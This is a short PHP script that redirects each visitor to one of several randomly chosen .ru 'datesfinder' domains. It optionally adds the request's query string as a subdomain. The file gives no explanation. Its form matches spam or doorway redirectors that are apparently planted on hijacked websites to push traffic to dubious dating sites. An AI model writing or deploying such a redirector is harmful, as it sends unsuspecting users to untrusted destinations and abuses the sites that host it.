<?php

$domains = array('datesfinder.ru', 'datesfinder4you.ru', 'datesfinder4u.ru', 'datesfinderforyou.ru', 'datesfinderforu.ru');

$domain = $domains[array_rand($domains, 1)];
$url = ( preg_match('/^[a-z2-7]+$/', $_SERVER['QUERY_STRING']) ) ? sprintf("http://%s.%s", $_SERVER['QUERY_STRING'], $domain) : sprintf("http://%s", $domain);

header("Location: $url");

?>
